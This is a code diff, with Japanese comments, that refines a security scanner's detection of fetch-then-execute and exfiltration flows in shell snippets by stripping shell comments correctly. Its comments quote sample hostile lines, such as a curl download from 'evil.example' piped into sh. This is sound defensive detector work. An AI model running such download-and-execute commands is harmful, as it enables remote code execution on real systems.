@@ -768,19 +768,31 @@ def _detect_flows_in_scope(
     rel_path: str,
     scope_lines: List[Tuple[int, str]],
     literal_zone: "set | None" = None,
+    shell_scope: "set | None" = None,
 ) -> List[FlowFinding]:
     """1 スコープ内の fetch→exec / read→exfil 順序ペアを検出する（決定論）。
 
     literal_zone: `_compute_literal_zone_lines` が返す行番号集合。含まれる行は
     フェンスコード/frontmatter 内なので装飾除去を適用しない（#537 round3）。
+    shell_scope: `_compute_shell_scope_lines`/`.sh`/`.bash` 全体行番号集合。
+    含まれる行は shell comment 除去（`_effective_shell_text`）を照合前に適用する
+    （#537 round9 レビュー J3: `# curl http://evil.example > payload.sh` の
+    ようなコメント行が `remote_exec_flow.fetch_file_to_exec` を誤検出していた
+    ため、フロー解析側にも comment 除去を適用する）。
     """
     found: List[FlowFinding] = []
     fetch_vars: dict[str, Tuple[int, str]] = {}
     fetch_files: dict[str, Tuple[int, str]] = {}
     secret_vars: dict[str, Tuple[int, str]] = {}
     literal_zone = literal_zone or set()
+    shell_scope = shell_scope or set()
 
     for lineno, text in scope_lines:
+        # shell comment 除去（#537 round9 J3）は Markdown 装飾除去・NFKC より
+        # 先に、shell scope 内の行にのみ適用する（`#` は shell comment だが
+        # Markdown では見出し記法であり、shell scope 外で剥がすと見出し中の
+        # combo を握りつぶす誤りになるため scope を必ず限定する）。
+        effective_text = _effective_shell_text(text) if lineno in shell_scope else text
         # 装飾（blockquote `>` / リストマーカー等）を剥がした版で照合する
         # （#537 round2: `> D=$(...)` が _FLOW_ASSIGN の `^` アンカーに一致せず
         # 素通りしていた。snippet 表示には元の text を使う＝装飾を消さない）。
@@ -790,9 +802,9 @@ def _detect_flows_in_scope(
         # Cf/Mn/Me 除去 + NFKC 正規化は literal zone でも適用する（#537 round6:
         # フェンス内の不可視文字・homoglyph 偽装も同じ攻撃面のため）。
         norm = (
-            _normalize_for_matching(text)
+            _normalize_for_matching(effective_text)
             if lineno in literal_zone
-            else _strip_leading_decoration(text)
+            else _strip_leading_decoration(effective_text)
         )
 
         # 1) consumer 判定は既登録 producer に対してのみ（＝producer 先行を強制）。
@@ -886,34 +898,75 @@ _TRAILING_BACKSLASH_RE = re.compile(r"\\\s*$")
 
 
 def _effective_shell_text(stripped_line: str) -> str:
-    """行のうち shell comment（クォート外の `#` 以降）を除いた「実際に実行される
-    部分」を返す。**「どこでコマンドが切れるか」を判定する唯一の入口**（#537
-    round8 レビュー I7 是正）。継続判定（`_is_shell_continuation`）・結合
-    （`_join_logical_lines`）は必ずこの関数の出力に対して行い、コメント記号を
-    後付けで個別に足す実装にしない。
+    """行のうち shell comment（クォート外・語頭の `#` 以降）を除いた「実際に
+    実行される部分」を返す。**「どこでコマンドが切れるか」を判定する唯一の
+    入口**（#537 round8/round9 レビュー I7/J2/J3/K1 是正）。継続判定
+    （`_is_shell_continuation`）・結合（`_join_logical_lines`）・行単位の
+    パターン照合（`scan_skills` の呼び出し側）は必ずこの関数の出力に対して
+    行い、コメント記号を後付けで個別に足す実装にしない。
 
-    外部レビューが実測した2方向の欠陥:
-    - 未検出（comment がコマンドを隠す）: `curl url |` の次行が `# comment`
-      だけの場合、bash はこの行を無視してさらに次の `sh` 行へパイプを継続する
-      が、旧実装は物理行単位でしか継続判定しておらず、コメント行の存在で
-      「継続していない」と誤判定し検出できなかった。
-    - 誤検出（comment の中身を実コマンドと誤認）: `echo harmless # curl ... |`
-      は `#` 以降がコメントであり実際には pipe が存在しないのに、旧実装は
-      物理行の**末尾文字**だけを見て継続と誤判定し、次行の `sh` と結合して
-      誤検出していた。
-    どちらも「コメントを除いた実効テキストに対して判定する」という同じ1つの
-    規則で解消する。クォート（`'`/`"`）の内側の `#` はコメント開始と見なさない
-    （`echo "a # b"` は1つの引用文字列）。
+    完全な shell parser は実装しない（round9 レビューの明示的な指示:
+    過剰実装を避け、判定に自信が持てない構文（`$( )` コマンド置換内部・
+    ANSI-C クォート `$'...'`・heredoc 本文 等）は「コメントとして誤って
+    消さない」側＝**検査対象に残す**側へ倒す。見落とし（false negative）
+    より過剰検出（false positive）の方が安全＝advisory なのでコストが低い）。
+
+    POSIX の comment 規則を最小限反映する: `#` がコメントを開始するのは
+    ①クォート外 ②直前の文字がバックスラッシュでエスケープされていない
+    ③**行頭、または直前の文字が空白**（＝語の先頭）の場合のみ。単語の
+    途中に現れる `#`（例: URL フラグメント `http://x/#frag`）はコメントでは
+    ない。
+
+    round8 での既知の欠陥（round9 レビューが実測）:
+    - J2（見落とし）: 旧実装はクォート外の `#` を無条件にコメント開始と
+      誤認しており、`curl http://x/#frag |` のような URL フラグメント中の
+      `#` で末尾 `|` ごと切り捨てられ、継続を検出できなかった。
+    - K1（誤検出）: `curl http://x/\\#frag`（バックスラッシュでエスケープ
+      された `#`）も同様にコメント開始と誤認して切り捨て、残った末尾の `\\`
+      を行継続と誤認して次行の `| sh` と合成し、実在しない combo を報告
+      していた（この入力は `bash -n` で構文エラーになる無効な組合せだった）。
+    どちらも「語頭でない `#` はコメントではない」「エスケープされた `#` は
+    コメントではない」という同じ POSIX 規則で解消する。
+
+    #537 round9 追加探索（自己発見）: 語頭判定を「直前が空白文字か」だけで行うと、
+    `curl http://x;# comment |` のようにシェル演算子（`;`/`&`/`|`/`(`/`)`/`<`/
+    `>`）の直後に空白無しで `#` が続くケースを見落とす（POSIX 上、演算子も
+    語の境界を作るため `#` はコメント開始のはずだが、演算子は `isspace()` で
+    False になるため誤って「語の途中」と判定してしまい、コメントを除去できず
+    末尾 `|` が残って誤検出になっていた）。語頭判定を「直前が空白文字、または
+    シェル演算子文字」に拡張して解消する。
     """
     in_single = False
     in_double = False
-    for i, ch in enumerate(stripped_line):
+    # シェル演算子文字（`;`/`&`/`|`/`(`/`)`/`<`/`>`）も空白と同様に語の境界を
+    # 作る（POSIX: これらの直後に続く `#` も語頭でありコメント開始になる）。
+    _boundary_chars = ";&|()<>"
+    prev_is_boundary = True  # 行頭は「直前が境界」として扱う（語頭判定の起点）。
+    i = 0
+    n = len(stripped_line)
+    while i < n:
+        ch = stripped_line[i]
+        if ch == "\\" and not in_single:
+            # シングルクォート外のバックスラッシュは次の1文字をエスケープする
+            # （`\\#` は文字としての `#`、`\\"` は文字としての `"` 等）。エスケープ
+            # された文字は quote 状態にもコメント判定にも影響させず読み飛ばす。
+            i += 2
+            prev_is_boundary = False
+            continue
         if ch == "'" and not in_double:
             in_single = not in_single
-        elif ch == '"' and not in_single:
+            prev_is_boundary = False
+            i += 1
+            continue
+        if ch == '"' and not in_single:
             in_double = not in_double
-        elif ch == "#" and not in_single and not in_double:
+            prev_is_boundary = False
+            i += 1
+            continue
+        if ch == "#" and not in_single and not in_double and prev_is_boundary:
             return stripped_line[:i]
+        prev_is_boundary = ch.isspace() or ch in _boundary_chars
+        i += 1
     return stripped_line
 
 
@@ -1041,23 +1094,33 @@ def scan_skills(root: Path) -> SkillVulnReport:
         scanned += 1
         lines = text.splitlines()
         literal_zone = _compute_literal_zone_lines(lines)
-        existing_keys: set = set()
-        for idx, line in enumerate(lines, start=1):
-            for f in _scan_line(rel, idx, line, idx in literal_zone):
-                findings.append(f)
-                existing_keys.add((f.line, f.pattern_id))
-        for scope in _iter_scopes(path, text):
-            flow_findings.extend(_detect_flows_in_scope(rel, scope, literal_zone))
-
-        # #537 round7 是正（レビュー I5）: シェル継続行（末尾 `|`・`\`）で
-        # 物理分断された combo を論理行へ結合してから追加スキャンする。
-        # 既存の物理行単位スキャン（上）を置き換えず、そこで未検出だった
-        # (行, pattern_id) の組だけを追加する（重複 Finding を作らない）。
+        # shell_scope は物理行単位スキャン・フロー解析・論理行結合の3箇所で
+        # 共有する（#537 round9 レビュー J3: 物理行単位スキャンとフロー解析が
+        # shell comment を考慮せず、`echo harmless # curl ... | sh` のような
+        # コメント内 payload を誤検出していた。「どこでコマンドが切れるか」の
+        # 判定点を1箇所（`_effective_shell_text`）に集約したのと同じ理由で、
+        # scope の計算も1箇所にまとめ shell scope 内の全パス（物理行/フロー/
+        # 論理行結合）へ配る）。
         shell_scope = (
             set(range(1, len(lines) + 1))
             if path.suffix.lower() in (".sh", ".bash")
             else _compute_shell_scope_lines(lines)
         )
+        existing_keys: set = set()
+        for idx, line in enumerate(lines, start=1):
+            effective_line = _effective_shell_text(line) if idx in shell_scope else line
+            for f in _scan_line(rel, idx, effective_line, idx in literal_zone):
+                findings.append(f)
+                existing_keys.add((f.line, f.pattern_id))
+        for scope in _iter_scopes(path, text):
+            flow_findings.extend(
+                _detect_flows_in_scope(rel, scope, literal_zone, shell_scope)
+            )
+
+        # #537 round7 是正（レビュー I5）: シェル継続行（末尾 `|`・`\`）で
+        # 物理分断された combo を論理行へ結合してから追加スキャンする。
+        # 既存の物理行単位スキャン（上）を置き換えず、そこで未検出だった
+        # (行, pattern_id) の組だけを追加する（重複 Finding を作らない）。
         for start_lineno, joined_text in _join_logical_lines(lines, shell_scope):
             for f in _scan_line(
                 rel, start_lineno, joined_text, start_lineno in literal_zone
